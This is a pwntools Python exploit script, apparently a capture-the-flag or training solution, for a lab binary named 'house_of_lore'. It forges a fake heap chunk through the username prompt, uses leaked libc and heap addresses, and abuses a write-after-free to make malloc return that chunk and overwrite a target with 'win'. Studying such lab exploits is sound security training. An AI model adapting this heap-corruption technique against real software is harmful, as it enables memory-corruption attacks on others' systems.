#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("house_of_lore")
libc = ELF(elf.runpath + b"/libc.so.6") # elf.libc broke again

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Index of allocated chunks.
index = 0

# Select the "malloc" option; send size.
# Returns chunk index.
def malloc(size):
    global index
    io.send(b"1")
    io.sendafter(b"size: ", f"{size}".encode())
    io.recvuntil(b"> ")
    index += 1
    return index - 1

# Select the "free" option; send index.
def free(index):
    io.send(b"2")
    io.sendafter(b"index: ",f"{index}".encode())
    io.recvuntil(b"> ")

# Select the "edit" option; send index & data.
def edit(index, data):
    io.send(b"3")
    io.sendafter(b"index: ", f"{index}".encode())
    io.sendafter(b"data: ", data)
    io.recvuntil(b"> ")

io = start()

# This binary leaks the address of puts(), use it to resolve the libc load address.
io.recvuntil(b"puts() @ ")
libc.address = int(io.recvline(), 16) - libc.sym.puts

# This binary leaks the heap start address.
io.recvuntil(b"heap @ ")
heap = int(io.recvline(), 16)

# =============================================================================

# Create fake chunk
payload = flat(
  elf.sym["user"],
  0x0,
  heap,
  elf.sym["user"] - 0x10
)

username = payload
io.sendafter(b"username: ", username)
io.recvuntil(b"> ")

# Request 2 "normal" chunks.
chunk_A = malloc(0x98)
chunk_B = malloc(0x88)

# Free the first chunk into the unsortedbin.
free(chunk_A)
chunk_C = malloc(0xa8) # trigger sorting unsortedbin

# Write after free
edit(chunk_A, p64(0xdeadbeef) + p64(elf.sym["user"]))

# Request fake chunk
smallbin = malloc(0x98)
winnchunk = malloc(0x98)
edit(winnchunk, p64(0x0) * 4 + b"win")

# =============================================================================

io.interactive()
